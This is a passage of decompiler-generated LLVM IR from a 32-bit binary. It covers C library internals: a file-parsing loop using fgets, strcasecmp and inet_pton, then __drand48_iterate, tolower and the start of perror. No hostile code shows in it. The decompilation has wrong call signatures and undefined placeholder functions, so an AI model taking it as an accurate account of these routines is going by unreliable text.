  store i32 %v0_8059b94.pre, i32* @eax, align 4
  %v2_8059b99 = mul nsw i32 %v2_8059b91, 2
  %v3_8059b99 = add i32 %v0_8059b94.pre, %v2_8059b99
  %v4_8059b99 = inttoptr i32 %v3_8059b99 to i8*
  %v5_8059b99 = load i8, i8* %v4_8059b99, align 1
  %v6_8059b99 = and i8 %v5_8059b99, 32
  %v7_8059b99 = icmp eq i8 %v6_8059b99, 0
  br i1 %v7_8059b99, label %dec_label_pc_8059b8a, label %dec_label_pc_8059b9f.loopexit

dec_label_pc_8059b9f.loopexit:                    ; preds = %dec_label_pc_8059b91, %dec_label_pc_8059b8a, %dec_label_pc_8059b8b.preheader
  %v4_8059b6b97149 = phi i32 [ %v6_8059b8b108, %dec_label_pc_8059b8b.preheader ], [ %v6_8059b8b, %dec_label_pc_8059b8a ], [ %v0_8059b94.pre, %dec_label_pc_8059b91 ]
  %v0_8059b9f.lcssa = phi i32 [ %v0_8059b8b.pre, %dec_label_pc_8059b8b.preheader ], [ %v1_8059b8a, %dec_label_pc_8059b8a ], [ %v0_8059b9f110, %dec_label_pc_8059b91 ]
  %v1_8059b8b.lcssa = phi i8* [ %v1_8059b8b104, %dec_label_pc_8059b8b.preheader ], [ %v1_8059b8b, %dec_label_pc_8059b8a ], [ %v1_8059b8b111, %dec_label_pc_8059b91 ]
  %v2_8059b9f = load i8, i8* %v1_8059b8b.lcssa, align 1
  %v3_8059b9f = icmp eq i8 %v2_8059b9f, 0
  %v1_8059ba2 = icmp eq i1 %v3_8059b9f, false
  br i1 %v1_8059ba2, label %dec_label_pc_8059b6b.preheader, label %dec_label_pc_8059ba4

dec_label_pc_8059b6b.preheader:                   ; preds = %dec_label_pc_8059b6b.preheader.preheader, %dec_label_pc_8059b9f.loopexit
  %v1_8059ba4.pre152 = phi i32 [ %v1_8059ba452, %dec_label_pc_8059b9f.loopexit ], [ 0, %dec_label_pc_8059b6b.preheader.preheader ]
  %v4_8059b6b97 = phi i32 [ %v4_8059b6b97149, %dec_label_pc_8059b9f.loopexit ], [ %v4_8059b6b97.pre, %dec_label_pc_8059b6b.preheader.preheader ]
  %v0_8059b6b47 = phi i32 [ %v0_8059b9f.lcssa, %dec_label_pc_8059b9f.loopexit ], [ %v4_8059c4d, %dec_label_pc_8059b6b.preheader.preheader ]
  %v1_8059b6b94 = inttoptr i32 %v0_8059b6b47 to i8*
  %v2_8059b6b95 = load i8, i8* %v1_8059b6b94, align 1
  %v3_8059b6b96 = zext i8 %v2_8059b6b95 to i32
  %v5_8059b6b98 = and i32 %v4_8059b6b97, -256
  %v6_8059b6b99 = or i32 %v5_8059b6b98, %v3_8059b6b96
  store i32 %v6_8059b6b99, i32* @eax, align 4
  %v4_8059b6d100 = icmp eq i8 %v2_8059b6b95, 0
  br i1 %v4_8059b6d100, label %dec_label_pc_8059ba4, label %dec_label_pc_8059b71

dec_label_pc_8059b6b.dec_label_pc_8059ba4.loopexit_crit_edge: ; preds = %dec_label_pc_8059b67
  %v1_8059ba4.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8059ba4

dec_label_pc_8059ba4:                             ; preds = %dec_label_pc_8059b9f.loopexit, %dec_label_pc_8059b6b.dec_label_pc_8059ba4.loopexit_crit_edge, %dec_label_pc_8059b6b.preheader, %dec_label_pc_8059b5f
  %v1_8059ba4 = phi i32 [ 0, %dec_label_pc_8059b5f ], [ %v1_8059ba4.pre.pre, %dec_label_pc_8059b6b.dec_label_pc_8059ba4.loopexit_crit_edge ], [ %v1_8059ba4.pre152, %dec_label_pc_8059b6b.preheader ], [ %v1_8059ba452, %dec_label_pc_8059b9f.loopexit ]
  %v0_8059ba4 = load i32, i32* @ebx, align 4
  %v2_8059ba4 = mul i32 %v1_8059ba4, 4
  %v3_8059ba4 = add i32 %v2_8059ba4, %v0_8059ba4
  %v4_8059ba4 = inttoptr i32 %v3_8059ba4 to i32*
  store i32 0, i32* %v4_8059ba4, align 4
  %v0_8059bab = load i32, i32* @edi, align 4
  %v7_8059bae = icmp sgt i32 %v0_8059bab, 1
  br i1 %v7_8059bae, label %dec_label_pc_8059bb4, label %dec_label_pc_8059c47.backedge

dec_label_pc_8059bb4:                             ; preds = %dec_label_pc_8059ba4
  br i1 %v12_80599f0, label %dec_label_pc_8059c81, label %dec_label_pc_8059bbf

dec_label_pc_8059bbf:                             ; preds = %dec_label_pc_8059bb4
  store i32 1, i32* @esi, align 4
  br i1 %v1_8059bc9, label %dec_label_pc_8059be1.lr.ph, label %dec_label_pc_8059bcb

dec_label_pc_8059be1.lr.ph:                       ; preds = %dec_label_pc_8059bbf
  br label %dec_label_pc_8059be1

dec_label_pc_8059bcb:                             ; preds = %dec_label_pc_8059bbf
  %v0_8059bcb = load i32, i32* @eax, align 4
  %v0_8059bcd = load i32, i32* @ebx, align 4
  %v1_8059bcd = inttoptr i32 %v0_8059bcd to i32*
  %v2_8059bcd = load i32, i32* %v1_8059bcd, align 4
  %v5_8059bd3 = call i32 @__GI_strcoll(i8* %v2_8059bea, i32 %v2_8059bcd, i32 %v0_8059bcb, i32 %v0_8059bcb)
  store i32 %v5_8059bd3, i32* %eax.global-to-local, align 4
  %v1_8059bdb = icmp eq i32 %v5_8059bd3, 0
  %v1_8059bdd = icmp eq i1 %v1_8059bdb, false
  br i1 %v1_8059bdd, label %dec_label_pc_8059c47.backedge, label %dec_label_pc_8059bfd

dec_label_pc_8059c47.backedge:                    ; preds = %dec_label_pc_8059bf6, %dec_label_pc_8059bcb, %dec_label_pc_8059ba4
  %v0_8059c47 = load i32, i32* @edx, align 4
  %v3_8059c51 = call i32 @fgets(i32 %v4_8059c4d, i32 %stack_var_4.0, i32 %v0_8059c47)
  store i32 %v3_8059c51, i32* %eax.global-to-local, align 4
  %v1_8059c59 = icmp eq i32 %v3_8059c51, 0
  %v1_8059c5b = icmp eq i1 %v1_8059c59, false
  br i1 %v1_8059c5b, label %dec_label_pc_8059b48, label %dec_label_pc_8059c61

dec_label_pc_8059be1:                             ; preds = %dec_label_pc_8059be1.lr.ph, %dec_label_pc_8059bf6
  %v1_8059be3124 = phi i32 [ 1, %dec_label_pc_8059be1.lr.ph ], [ %v1_8059bf6, %dec_label_pc_8059bf6 ]
  %v0_8059be3 = load i32, i32* @ebx, align 4
  %v2_8059be3 = mul i32 %v1_8059be3124, 4
  %v3_8059be3 = add i32 %v0_8059be3, %v2_8059be3
  %v4_8059be3 = inttoptr i32 %v3_8059be3 to i32*
  %v5_8059be3 = load i32, i32* %v4_8059be3, align 4
  %v3_8059bea = call i32 @__GI_strcasecmp(i8* %v2_8059bea, i32 %v5_8059be3)
  store i32 %v3_8059bea, i32* %eax.global-to-local, align 4
  %v1_8059bf2 = icmp eq i32 %v3_8059bea, 0
  br i1 %v1_8059bf2, label %dec_label_pc_8059bfd, label %dec_label_pc_8059bf6

dec_label_pc_8059bf6:                             ; preds = %dec_label_pc_8059be1
  %v0_8059bf6 = load i32, i32* @esi, align 4
  %v1_8059bf6 = add i32 %v0_8059bf6, 1
  store i32 %v1_8059bf6, i32* @esi, align 4
  %v1_8059bf7.pre = load i32, i32* @edi, align 4
  %v5_8059bf9 = icmp slt i32 %v1_8059bf6, %v1_8059bf7.pre
  br i1 %v5_8059bf9, label %dec_label_pc_8059be1, label %dec_label_pc_8059c47.backedge

dec_label_pc_8059bfd:                             ; preds = %dec_label_pc_8059bcb, %dec_label_pc_8059be1
  br i1 %v1_8059c02, label %dec_label_pc_8059c1f, label %dec_label_pc_8059c04

dec_label_pc_8059c04:                             ; preds = %dec_label_pc_8059bfd
  %v0_8059c04 = load i32, i32* @esi, align 4
  %v3_8059c05 = load i8*, i8** %stack_var_-44, align 4
  %v4_8059c05 = ptrtoint i8* %v3_8059c05 to i32
  %v0_8059c09 = load i32, i32* @ebx, align 4
  %v1_8059c09 = inttoptr i32 %v0_8059c09 to i32*
  %v2_8059c09 = load i32, i32* %v1_8059c09, align 4
  %v4_8059c0d = inttoptr i32 %v2_8059c09 to i8*
  %v5_8059c0d = call i32 @inet_pton(i32 2, i8* %v4_8059c0d, i32 %v4_8059c05, i32 %v0_8059c04)
  store i32 %v5_8059c0d, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_8059c0d, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8059a9d, label %dec_label_pc_8059c47.outer.backedge

dec_label_pc_8059c47.outer.backedge:              ; preds = %dec_label_pc_8059c04, %dec_label_pc_8059c26, %dec_label_pc_8059c1f
  %v0_8059c47125 = load i32, i32* @edx, align 4
  %v3_8059c51126 = call i32 @fgets(i32 %v4_8059c4d, i32 %stack_var_4.0, i32 %v0_8059c47125)
  store i32 %v3_8059c51126, i32* %eax.global-to-local, align 4
  %v1_8059c59127 = icmp eq i32 %v3_8059c51126, 0
  %v1_8059c5b128 = icmp eq i1 %v1_8059c59127, false
  br i1 %v1_8059c5b128, label %dec_label_pc_8059b48.lr.ph, label %dec_label_pc_8059c61

dec_label_pc_8059c1f:                             ; preds = %dec_label_pc_8059bfd
  br i1 %v1_8059c24, label %dec_label_pc_8059c47.outer.backedge, label %dec_label_pc_8059c26

dec_label_pc_8059c26:                             ; preds = %dec_label_pc_8059c1f
  %v0_8059c26 = load i32, i32* @ecx, align 4
  %v0_8059c2b = load i32, i32* @ebx, align 4
  %v1_8059c2b = inttoptr i32 %v0_8059c2b to i32*
  %v2_8059c2b = load i32, i32* %v1_8059c2b, align 4
  %v4_8059c2f = inttoptr i32 %v2_8059c2b to i8*
  %v5_8059c2f = call i32 @inet_pton(i32 10, i8* %v4_8059c2f, i32 %stack_var_-36.0, i32 %v0_8059c26)
  store i32 %v5_8059c2f, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_8059c2f, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_8059aca, label %dec_label_pc_8059c47.outer.backedge

dec_label_pc_8059c61:                             ; preds = %dec_label_pc_8059c47.outer.backedge, %dec_label_pc_8059b31, %dec_label_pc_8059c47.backedge, %dec_label_pc_8059af6
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8059af6 ], [ 1, %dec_label_pc_8059b31 ], [ 2, %dec_label_pc_8059c47.outer.backedge ], [ %stack_var_-28.0.ph136, %dec_label_pc_8059c47.backedge ]
  br i1 %v12_80599f0, label %dec_label_pc_8059c81, label %dec_label_pc_8059c68

dec_label_pc_8059c68:                             ; preds = %dec_label_pc_8059c61
  %v1_8059c6f = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8059c6f = call i32 @__GI_fclose(i16* %v1_8059c6f)
  store i32 %v2_8059c6f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059c81

dec_label_pc_8059c81:                             ; preds = %dec_label_pc_8059bb4, %dec_label_pc_80599d1, %dec_label_pc_80599dd, %dec_label_pc_80599fb, %dec_label_pc_8059a0e, %dec_label_pc_8059a1a, %dec_label_pc_8059a23, %dec_label_pc_8059a4d, %dec_label_pc_8059c61, %dec_label_pc_8059c68, %dec_label_pc_8059a83
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8059c61 ], [ %stack_var_-28.1, %dec_label_pc_8059c68 ], [ %v2_8059a92, %dec_label_pc_8059a83 ], [ 34, %dec_label_pc_8059a4d ], [ 34, %dec_label_pc_8059a23 ], [ 34, %dec_label_pc_8059a1a ], [ 34, %dec_label_pc_8059a0e ], [ 34, %dec_label_pc_80599fb ], [ 34, %dec_label_pc_80599dd ], [ 34, %dec_label_pc_80599d1 ], [ %stack_var_-28.0.ph136, %dec_label_pc_8059bb4 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80599bc, i32* @ebx, align 4
  store i32 %v0_80599bb, i32* @esi, align 4
  store i32 %v0_80599ba, i32* @edi, align 4
  store i32 %v0_80599b9, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v3_8059c51126, { 1, 2, 0 }
  uselistorder i32 %v1_8059bf6, { 0, 2, 1 }
  uselistorder i32 %v3_8059c51, { 1, 2, 0 }
  uselistorder i8 %v2_8059b6b95, { 1, 2, 0 }
  uselistorder i8* %v1_8059b6b94, { 1, 0 }
  uselistorder i32 %v0_8059b6b47, { 1, 0 }
  uselistorder i32 %v2_8059b91, { 1, 0 }
  uselistorder i32 %v1_8059b8a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8059b94.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8059b7f, { 1, 0 }
  uselistorder i32 %v0_8059b7f, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8059b71, { 1, 0 }
  uselistorder i32 %v3_8059c51129, { 1, 0 }
  uselistorder i8* %v2_8059bea, { 1, 0 }
  uselistorder i32 %v4_8059c4d, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_8059a0e, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80599e9, { 1, 0 }
  uselistorder i32 %v1_80599cc, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 6, 0, 11, 12, 17, 13, 15, 16, 14, 1, 7, 4, 5, 8, 9, 10, 18, 21, 19, 20, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 0, 12, 13, 15, 16, 10, 1, 2, 17, 18, 19, 14, 11 }
  uselistorder i32 (i16*)* @__GI_fclose, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 4, 6, 7, 0, 1, 2, 3, 5 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_strcoll, { 1, 2, 3, 4, 0 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 21, 22, 23, 24, 25, 14, 29, 0, 1, 20, 2, 26, 30, 31, 27, 28, 3, 4, 5, 6, 7, 8, 11, 15, 10, 16, 9, 17, 12, 18, 13, 19 }
  uselistorder i32* @global_var_8062a20, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 35, { 4, 6, 0, 1, 2, 7, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 5, 0, 4, 6, 3, 2 }
  uselistorder i32 (i32)* @__errno_location, { 59, 120, 119, 118, 58, 45, 43, 53, 41, 40, 33, 32, 31, 30, 115, 56, 125, 124, 123, 122, 0, 117, 39, 48, 25, 24, 23, 71, 70, 116, 34, 29, 22, 21, 64, 63, 62, 61, 114, 113, 112, 26, 28, 27, 96, 13, 89, 55, 47, 38, 46, 1, 51, 50, 68, 67, 65, 16, 66, 60, 12, 5, 4, 95, 54, 11, 77, 103, 102, 104, 76, 52, 111, 110, 57, 69, 109, 8, 10, 17, 108, 106, 42, 9, 2, 37, 94, 36, 44, 3, 107, 49, 35, 20, 7, 6, 105, 15, 14, 101, 100, 99, 93, 98, 97, 19, 18, 92, 91, 90, 88, 87, 86, 85, 84, 83, 82, 81, 80, 126, 79, 121, 78, 75, 74, 73, 72 }
  uselistorder i32 80, { 0, 8, 15, 6, 9, 10, 11, 12, 13, 14, 2, 3, 5, 7, 1, 4 }
  uselistorder i32 56, { 7, 21, 19, 20, 8, 9, 10, 11, 12, 2, 22, 3, 1, 14, 13, 15, 6, 0, 23, 16, 17, 18, 5, 24, 25, 4 }
  uselistorder i32 44, { 16, 17, 18, 11, 23, 24, 25, 19, 20, 12, 2, 4, 5, 3, 6, 7, 9, 8, 10, 1, 29, 31, 30, 26, 27, 28, 21, 22, 15, 13, 14, 32, 33, 0 }
  uselistorder i32 36, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 2, 3, 27, 14, 15, 12, 33, 8, 9, 28, 7, 0, 6, 29, 30, 31, 32, 13, 16, 5, 10, 4, 11 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 21, 19, 3, 9, 4, 22, 23, 16, 17, 18, 0, 10, 6, 5, 1, 12, 7, 8, 24, 25, 26, 27, 2, 28, 29, 20, 13, 14, 15, 11 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 -32, { 13, 11, 0, 5, 6, 1, 2, 12, 4, 7, 3, 8, 9, 10 }
  uselistorder i32 32, { 99, 35, 100, 101, 34, 39, 125, 40, 123, 42, 126, 127, 102, 48, 103, 104, 105, 46, 47, 73, 74, 75, 77, 2, 1, 4, 3, 43, 76, 5, 78, 79, 80, 81, 82, 83, 84, 85, 61, 62, 63, 64, 65, 66, 0, 6, 67, 68, 69, 124, 53, 54, 111, 32, 134, 41, 52, 96, 97, 98, 33, 128, 8, 7, 9, 10, 49, 11, 131, 12, 13, 14, 15, 16, 17, 36, 106, 107, 108, 112, 113, 37, 114, 115, 116, 117, 118, 119, 120, 18, 121, 122, 50, 129, 130, 109, 20, 19, 21, 22, 23, 24, 25, 110, 86, 87, 88, 89, 70, 92, 132, 133, 93, 90, 91, 71, 72, 55, 38, 56, 57, 58, 59, 60, 26, 27, 94, 29, 28, 44, 95, 45, 31, 30, 51 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8059c81, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8059c61, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8059c47.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8059bfd, { 1, 0 }
  uselistorder label %dec_label_pc_8059be1, { 1, 0 }
  uselistorder label %dec_label_pc_8059ba4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8059b6b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8059b91, { 1, 0 }
  uselistorder label %dec_label_pc_8059b5f, { 1, 0 }
  uselistorder label %dec_label_pc_8059b48, { 1, 0 }
  uselistorder label %dec_label_pc_8059b48.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8059b31, { 1, 0 }
  uselistorder label %dec_label_pc_8059af6, { 1, 0 }
  uselistorder label %dec_label_pc_8059a4d, { 1, 0 }
  uselistorder label %dec_label_pc_80599dd, { 1, 0 }
}

define i32 @__drand48_iterate(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v1_8059c9b = add i32 %arg2, 14
  %v2_8059c9b = inttoptr i32 %v1_8059c9b to i16*
  %v3_8059c9b = load i16, i16* %v2_8059c9b, align 2
  %v4_8059c9b = icmp eq i16 %v3_8059c9b, 0
  %v1_8059ca0 = icmp eq i1 %v4_8059c9b, false
  br i1 %v1_8059ca0, label %dec_label_pc_8059cbc, label %dec_label_pc_8059ca2

dec_label_pc_8059ca2:                             ; preds = %entry
  %v1_8059ca2 = add i32 %arg2, 16
  %v2_8059ca2 = inttoptr i32 %v1_8059ca2 to i32*
  store i32 -554899859, i32* %v2_8059ca2, align 4
  %v0_8059ca9 = load i32, i32* %esi.global-to-local, align 4
  %v1_8059ca9 = add i32 %v0_8059ca9, 20
  %v2_8059ca9 = inttoptr i32 %v1_8059ca9 to i32*
  store i32 5, i32* %v2_8059ca9, align 4
  %v0_8059cb0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8059cb0 = add i32 %v0_8059cb0, 12
  %v2_8059cb0 = inttoptr i32 %v1_8059cb0 to i16*
  store i16 11, i16* %v2_8059cb0, align 2
  %v0_8059cb6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8059cb6 = add i32 %v0_8059cb6, 14
  %v2_8059cb6 = inttoptr i32 %v1_8059cb6 to i16*
  store i16 1, i16* %v2_8059cb6, align 2
  %v0_8059ce6.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059cbc

dec_label_pc_8059cbc:                             ; preds = %entry, %dec_label_pc_8059ca2
  %v0_8059cff = phi i32 [ %arg2, %entry ], [ %v0_8059ce6.pre, %dec_label_pc_8059ca2 ]
  %v4_8059cbc = ptrtoint i16* %arg1 to i32
  store i32 %v4_8059cbc, i32* %edx.global-to-local, align 4
  store i32 %v4_8059cbc, i32* %ecx.global-to-local, align 4
  %v1_8059cc4 = add i32 %v4_8059cbc, 2
  %v2_8059cc4 = inttoptr i32 %v1_8059cc4 to i16*
  %v3_8059cc4 = load i16, i16* %v2_8059cc4, align 2
  %v4_8059cc4 = zext i16 %v3_8059cc4 to i32
  %v2_8059cc8 = mul nuw i32 %v4_8059cc4, 65536
  store i32 %v2_8059cc8, i32* %eax.global-to-local, align 4
  %v1_8059cd6 = add i32 %v4_8059cbc, 4
  %v2_8059cd6 = inttoptr i32 %v1_8059cd6 to i16*
  %v3_8059cd6 = load i16, i16* %v2_8059cd6, align 2
  %v4_8059cd6 = zext i16 %v3_8059cd6 to i32
  store i32 %v4_8059cd6, i32* %eax.global-to-local, align 4
  %v2_8059cda = load i16, i16* %arg1, align 2
  %v3_8059cda = zext i16 %v2_8059cda to i32
  store i32 %v3_8059cda, i32* %ecx.global-to-local, align 4
  store i32 %v4_8059cd6, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8059ce6 = add i32 %v0_8059cff, 16
  %v2_8059ce6 = inttoptr i32 %v1_8059ce6 to i32*
  %v3_8059ce6 = load i32, i32* %v2_8059ce6, align 4
  store i32 %v3_8059cda, i32* %eax.global-to-local, align 4
  store i32 %v4_8059cd6, i32* %edx.global-to-local, align 4
  %v2_8059cf0 = or i32 %v3_8059cda, %v2_8059cc8
  store i32 %v2_8059cf0, i32* %ecx.global-to-local, align 4
  %v4_8059cf2 = mul i32 %v3_8059ce6, %v4_8059cd6
  %v1_8059cf5 = add i32 %v0_8059cff, 20
  %v2_8059cf5 = inttoptr i32 %v1_8059cf5 to i32*
  %v3_8059cf5 = load i32, i32* %v2_8059cf5, align 4
  store i32 %v2_8059cf0, i32* %eax.global-to-local, align 4
  %v4_8059cfa = mul i32 %v3_8059cf5, %v2_8059cf0
  store i32 %v4_8059cfa, i32* %edx.global-to-local, align 4
  %v2_8059cfd = add i32 %v4_8059cfa, %v4_8059cf2
  %v3_8059cff = load i32, i32* %v2_8059ce6, align 4
  %v5_8059cff = zext i32 %v3_8059cff to i64
  %v6_8059cff = zext i32 %v2_8059cf0 to i64
  %v7_8059cff = mul nuw i64 %v5_8059cff, %v6_8059cff
  %v8_8059cff = trunc i64 %v7_8059cff to i32
  %v9_8059cff = udiv i64 %v7_8059cff, 4294967296
  %v10_8059cff = trunc i64 %v9_8059cff to i32
  store i32 %v8_8059cff, i32* %eax.global-to-local, align 4
  store i32 %v10_8059cff, i32* %edx.global-to-local, align 4
  store i32 %v8_8059cff, i32* %ecx.global-to-local, align 4
  %v1_8059d04 = add i32 %v0_8059cff, 12
  %v2_8059d04 = inttoptr i32 %v1_8059d04 to i16*
  %v3_8059d04 = load i16, i16* %v2_8059d04, align 2
  %v4_8059d04 = zext i16 %v3_8059d04 to i32
  %v2_8059d08 = add i32 %v10_8059cff, %v2_8059cfd
  %v2_8059d0d = add i32 %v4_8059d04, %v8_8059cff
  %v7_8059d0d = icmp ult i32 %v2_8059d0d, %v4_8059d04
  store i32 %v2_8059d0d, i32* %eax.global-to-local, align 4
  store i32 %v4_8059cbc, i32* %ecx.global-to-local, align 4
  %v3_8059d13 = zext i1 %v7_8059d0d to i32
  %v5_8059d13 = add i32 %v2_8059d08, %v3_8059d13
  store i32 %v5_8059d13, i32* %edx.global-to-local, align 4
  %v1_8059d15 = trunc i32 %v2_8059d0d to i16
  store i16 %v1_8059d15, i16* %arg1, align 2
  %v0_8059d18 = load i32, i32* %eax.global-to-local, align 4
  %v3_8059d18 = udiv i32 %v0_8059d18, 65536
  %v4_8059d18 = mul i32 %v5_8059d13, 65536
  %v5_8059d18 = or i32 %v4_8059d18, %v3_8059d18
  store i32 %v5_8059d18, i32* %eax.global-to-local, align 4
  %v2_8059d1c = udiv i32 %v5_8059d13, 65536
  store i32 %v2_8059d1c, i32* %edx.global-to-local, align 4
  %v1_8059d1f = trunc i32 %v3_8059d18 to i16
  %v2_8059d1f = load i32, i32* %ecx.global-to-local, align 4
  %v3_8059d1f = add i32 %v2_8059d1f, 2
  %v4_8059d1f = inttoptr i32 %v3_8059d1f to i16*
  store i16 %v1_8059d1f, i16* %v4_8059d1f, align 2
  %v0_8059d23 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059d23 = load i32, i32* %edx.global-to-local, align 4
  %v3_8059d23 = udiv i32 %v0_8059d23, 65536
  %v2_8059d27 = udiv i32 %v1_8059d23, 65536
  store i32 %v2_8059d27, i32* %edx.global-to-local, align 4
  %v1_8059d2a = trunc i32 %v3_8059d23 to i16
  %v2_8059d2a = load i32, i32* %ecx.global-to-local, align 4
  %v3_8059d2a = add i32 %v2_8059d2a, 4
  %v4_8059d2a = inttoptr i32 %v3_8059d2a to i16*
  store i16 %v1_8059d2a, i16* %v4_8059d2a, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_8059d04, { 1, 0 }
  uselistorder i32 %v2_8059cf0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8059cc8, { 1, 0 }
  uselistorder i32 %v4_8059cbc, { 3, 0, 2, 1, 4 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 14, 13, 15, 16, 17, 18, 20, 19 }
  uselistorder i16 1, { 3, 2, 4, 1, 0 }
  uselistorder i32 20, { 88, 89, 70, 71, 72, 41, 5, 75, 8, 90, 40, 95, 93, 96, 97, 73, 11, 74, 27, 28, 29, 30, 31, 32, 33, 34, 35, 94, 42, 43, 44, 45, 46, 47, 48, 3, 36, 49, 50, 51, 52, 53, 76, 77, 9, 91, 92, 56, 6, 13, 54, 65, 55, 98, 81, 82, 83, 1, 84, 2, 85, 12, 86, 87, 99, 78, 62, 79, 57, 58, 59, 60, 61, 80, 101, 100, 14, 15, 16, 17, 18, 19, 20, 24, 21, 22, 23, 0, 25, 26, 4, 63, 37, 38, 39, 64, 66, 67, 10, 68, 69, 7 }
  uselistorder i16 0, { 18, 0, 8, 19, 16, 1, 9, 2, 10, 3, 15, 20, 13, 21, 22, 6, 7, 11, 12, 17, 4, 5, 14 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8059cbc, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8059d3c = add i32 %arg1, 128
  %v6_8059d47 = icmp ugt i32 %v1_8059d3c, 383
  br i1 %v6_8059d47, label %dec_label_pc_8059d52, label %dec_label_pc_8059d49

dec_label_pc_8059d49:                             ; preds = %entry
  %v0_8059d49 = load i32, i32* bitcast (i32** @global_var_8062a28.229 to i32*), align 8
  %v2_8059d4e = mul i32 %arg1, 2
  %v3_8059d4e = add i32 %v0_8059d49, %v2_8059d4e
  %v4_8059d4e = inttoptr i32 %v3_8059d4e to i16*
  %v5_8059d4e = load i16, i16* %v4_8059d4e, align 2
  %v6_8059d4e = sext i16 %v5_8059d4e to i32
  store i32 %v6_8059d4e, i32* @edx, align 4
  br label %dec_label_pc_8059d52

dec_label_pc_8059d52:                             ; preds = %entry, %dec_label_pc_8059d49
  %v0_8059d52 = phi i32 [ %arg1, %entry ], [ %v6_8059d4e, %dec_label_pc_8059d49 ]
  ret i32 %v0_8059d52

; uselistorder directives
  uselistorder i32 65536, { 2, 3, 4, 0, 5, 1, 6, 8, 9, 7, 10, 59, 11, 12, 13, 14, 15, 16, 17, 19, 18, 21, 20, 23, 22, 25, 24, 26, 27, 60, 62, 28, 30, 29, 35, 31, 36, 32, 37, 33, 38, 34, 41, 39, 42, 40, 44, 43, 45, 47, 46, 49, 48, 51, 50, 52, 53, 55, 58, 54, 56, 57, 61 }
  uselistorder i32 128, { 19, 5, 14, 16, 6, 15, 23, 17, 3, 7, 8, 9, 10, 20, 0, 21, 22, 4, 1, 24, 11, 12, 13, 18, 2 }
  uselistorder label %dec_label_pc_8059d52, { 1, 0 }
}

define i32 @perror() local_unnamed_addr {
entry:
  %tmp = call i8* @__decompiler_undefined_function_1()
  %v1_8059d5f = icmp eq i8* %tmp, null
  br i1 %v1_8059d5f, label %dec_label_pc_8059d6d, label %dec_label_pc_8059d63

dec_label_pc_8059d63:                             ; preds = %entry
  %v4_8059d5b = ptrtoint i8* %tmp to i32
  store i32 ptrtoint ([3 x i8]* @global_var_805cd6c.352 to i32), i32* @edx, align 4
  %v2_8059d68 = load i8, i8* %tmp, align 1
  %v3_8059d68 = icmp eq i8 %v2_8059d68, 0
  %v1_8059d6b = icmp eq i1 %v3_8059d68, false
  br i1 %v1_8059d6b, label %dec_label_pc_8059d74, label %dec_label_pc_8059d6d

